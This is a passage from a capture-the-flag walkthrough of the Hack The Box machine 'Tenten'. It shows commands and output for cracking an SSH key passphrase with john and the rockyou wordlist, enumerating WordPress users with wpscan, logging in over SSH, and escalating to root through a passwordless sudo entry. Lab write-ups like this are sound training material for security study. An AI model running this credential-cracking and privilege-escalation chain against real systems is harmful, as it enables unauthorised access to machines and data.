Warning: only loading hashes of type "SSH", but also saw type "mysql"  
Use the "--format=mysql" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "oracle"  
Use the "--format=oracle" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1"  
Use the "--format=Raw-SHA1" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "LM"  
Use the "--format=LM" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-AxCrypt"  
Use the "--format=Raw-SHA1-AxCrypt" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "bfegg"  
Use the "--format=bfegg" option to force loading hashes of that type instead  
Warning: invalid UTF-8 seen reading /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
Warning: only loading hashes of type "SSH", but also saw type "dynamic=md5($p)"  
Use the "--format=dynamic=md5($p)" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA256"  
Use the "--format=Raw-SHA256" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "HAVAL-128-4"  
Use the "--format=HAVAL-128-4" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "raw-SHA256-opencl"  
Use the "--format=raw-SHA256-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA256"  
Use the "--format=HMAC-SHA256" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA512"  
Use the "--format=HMAC-SHA512" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Tiger"  
Use the "--format=Tiger" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "lotus5"  
Use the "--format=lotus5" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA224"  
Use the "--format=HMAC-SHA224" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "MD2"  
Use the "--format=MD2" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA1-Linkedin"  
Use the "--format=Raw-SHA1-Linkedin" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "mdc2"  
Use the "--format=mdc2" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "mscash"  
Use the "--format=mscash" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "mscash2"  
Use the "--format=mscash2" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-SHA224"  
Use the "--format=Raw-SHA224" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Palshop"  
Use the "--format=Palshop" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "NT"  
Use the "--format=NT" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "ripemd-160"  
Use the "--format=ripemd-160" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD4"  
Use the "--format=Raw-MD4" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5"  
Use the "--format=Raw-MD5" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "hMailServer"  
Use the "--format=hMailServer" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Raw-MD5u"  
Use the "--format=Raw-MD5u" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "ripemd-128"  
Use the "--format=ripemd-128" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "gost"  
Use the "--format=gost" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "Snefru-128"  
Use the "--format=Snefru-128" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "ZipMonster"  
Use the "--format=ZipMonster" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "bsdicrypt"  
Use the "--format=bsdicrypt" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "lotus5-opencl"  
Use the "--format=lotus5-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "LM-opencl"  
Use the "--format=LM-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "HMAC-SHA384"  
Use the "--format=HMAC-SHA384" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "oracle11"  
Use the "--format=oracle11" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "xsha"  
Use the "--format=xsha" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "mscash-opencl"  
Use the "--format=mscash-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "mscash2-opencl"  
Use the "--format=mscash2-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "NT-opencl"  
Use the "--format=NT-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "lotus85"  
Use the "--format=lotus85" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "raw-MD4-opencl"  
Use the "--format=raw-MD4-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "raw-MD5-opencl"  
Use the "--format=raw-MD5-opencl" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "HAVAL-256-3"  
Use the "--format=HAVAL-256-3" option to force loading hashes of that type instead  
Warning: only loading hashes of type "SSH", but also saw type "plaintext"  
Use the "--format=plaintext" option to force loading hashes of that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes  
Cost 2 (iteration count) is 1 for all loaded hashes  
Will run 8 OpenMP threads  
Note: This format may emit false positives, so it will keep trying even after  
finding a possible candidate.  
Press 'q' or Ctrl-C to abort, almost any other key for status  
0g 0:00:00:00 DONE (2026-05-29 18:55) 0g/s 177300p/s 177300c/s 177300C/s paagal..sss  
Session completed
```

```bash
>  john --show id_rsa_tenten.hash  
  
0 password hashes cracked, 1 left
```

Looks like it failed.

We retry :

```bash
>  ssh2john id_rsa > id_rsa_tenten.hash  
  
>  john id_rsa_tenten.hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"  
Use the "--format=ssh-opencl" option to force loading these as that type instead  
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes  
Cost 2 (iteration count) is 1 for all loaded hashes  
Will run 8 OpenMP threads  
Note: This format may emit false positives, so it will keep trying even after  
finding a possible candidate.  
Press 'q' or Ctrl-C to abort, almost any other key for status  
superpassword    (id_rsa)  
Warning: Only 1 candidate left, minimum 8 needed for performance.  
1g 0:00:00:11 DONE (2026-05-29 19:00) 0.08583g/s 1231Kp/s 1231Kc/s 1231KC/s *7¡Vamos!  
Session completed

>  john --show id_rsa_tenten.hash  
  
id_rsa:superpassword  
  
1 password hash cracked, 0 left
```

And we got the password. We just need a username now.

```bash
>  wpscan --url http://tenten.htb --enumerate u 2>/dev/null | tee ~/tenten-wpscan-users.txt  
  
_______________________________________________________________  
        __          _______   _____  
        \ \        / /  __ \ / ____|  
         \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` |    \  
           \  /\  /  | |     ____) | (__| (_| | | | |  
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|  
  
                 WordPress Security Scanner  
                        Version 4.0.0  
                   An Automattic endeavor  
                   https://automattic.com  
_______________________________________________________________  
  
[+] URL: http://tenten.htb/ [10.129.5.48]  
[+] Started: Fri May 29 19:06:51 2026  
[+] Command Line: wpscan --url http://tenten.htb --enumerate u  
[+] Hostname: blackarch  
  
Interesting Finding(s):  
  
[+] Headers  
| Interesting Entry: Server: Apache/2.4.18 (Ubuntu)  
| Found By: Headers (Passive Detection)  
| Confidence: 100%  
  
[+] XML-RPC seems to be enabled: http://tenten.htb/xmlrpc.php  
| Found By: Direct Access (Aggressive Detection)  
| Confidence: 100%  
| References:  
|  - http://codex.wordpress.org/XML-RPC_Pingback_API  
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/  
|  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/  
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/  
|  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/  
  
[+] WordPress readme found: http://tenten.htb/readme.html  
| Found By: Direct Access (Aggressive Detection)  
| Confidence: 100%  
  
[+] The external WP-Cron seems to be enabled: http://tenten.htb/wp-cron.php  
| Found By: Direct Access (Aggressive Detection)  
| Confidence: 60%  
| References:  
|  - https://www.iplocation.net/defend-wordpress-from-ddos  
|  - https://github.com/wpscanteam/wpscan/issues/1299  
  
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).  
| Found By: Rss Generator (Passive Detection)  
|  - http://tenten.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>  
| Confirmed By: Rss Generator (Passive Detection)  
|  - http://tenten.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.3</generator>  
  
[+] WordPress theme in use: twentyseventeen  
| Location: http://tenten.htb/wp-content/themes/twentyseventeen/  
| Last Updated: 2026-05-19 10:00pm GMT (9 days ago, per WordPress.org)  
| Active Installs: 300,000 (per WordPress.org)  
| Readme: http://tenten.htb/wp-content/themes/twentyseventeen/README.txt  
| [!] The version is out of date, the latest version is 4.1  
| Style URL: http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3  
| Style Name: Twenty Seventeen  
| Style URI: https://wordpress.org/themes/twentyseventeen/  
| Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...  
| Author: the WordPress team  
| Author URI: https://wordpress.org/  
|  
| Found By: Css Style In Homepage (Passive Detection)  
|  
| Version: 1.1 (80% confidence)  
| Found By: Style (Passive Detection)  
|  - http://tenten.htb/wp-content/themes/twentyseventeen/style.css?ver=4.7.3, Match: 'Version: 1.1'  
  
[+] Enumerating Users (via Passive and Aggressive Methods)  
  
[+] takis  
| Found By: Author Posts - Author Pattern (Passive Detection)  
  
Brute Forcing Author IDs -: |===================================================================================================================================================================================|  
[i] 1 user(s) Identified.  
[!] No WPScan API Token given, as a result vulnerability data has not been output.  
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register  
[+] Finished: Fri May 29 19:07:36 2026  
[+] Requests Done: 13  
[+] Cached Requests: 50  
[+] Most response codes received: 404: 10, 200: 2, 301: 1  
[+] Data Sent: 3.254 KB  
[+] Data Received: 7.938 KB  
[+] Memory used: 178.512 MB  
[+] Elapsed time: 00:00:44
```

`[+] Enumerating Users (via Passive and Aggressive Methods)  [+] takis`*

Looks like we got our login : `takis` with the private key + the key's password as `superpassword`

```bash
>  chmod 600 id_rsa  
  
>  ssh -i id_rsa takis@tenten.htb  
  
The authenticity of host 'tenten.htb (10.129.5.48)' can t be established.  
ED25519 key fingerprint is: SHA256:5a3db7g5K/KVQU7u9yholvmJI7kp3pWZj0qtGz4Yr9Q  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added 'tenten.htb' (ED25519) to the list of known hosts.  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
Enter passphrase for key 'id_rsa':    
Enter passphrase for key 'id_rsa':    
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/advantage  
  
65 packages can be updated.  
39 updates are security updates.  
  
  
Last login: Fri May  5 23:05:36 2017  
To run a command as administrator (user "root"), use "sudo <command>".  
See "man sudo_root" for details.  
  
takis@tenten:~$
```

And we got foothold.

```bash
takis@tenten:~$ ls  
user.txt  
takis@tenten:~$ cat user.txt  
aa1bbd*************70bda3e2
```

Nothing here but the user flag, it seems.

```bash
takis@tenten:~$ sudo -l  
Matching Defaults entries for takis on tenten:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User takis may run the following commands on tenten:  
   (ALL : ALL) ALL  
   (ALL) NOPASSWD: /bin/fuckin
```

Then, with (ALL : ALL) we get root access :

```bash
takis@tenten:~$ sudo /bin/fuckin /bin/bash
root@tenten:~# cd /  
root@tenten:/# ls  
bin  boot  dev  etc  home  initrd.img  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  var  vmlinuz  
root@tenten:/# cd /root/  
root@tenten:/root# cat root.txt  
cbe73f8*************5e021285
```
I took a nap between user and flag, expecting more friction, I didn't expect the privilege escalation to be so fast.
```

And we got root. Fastest privesc ever.
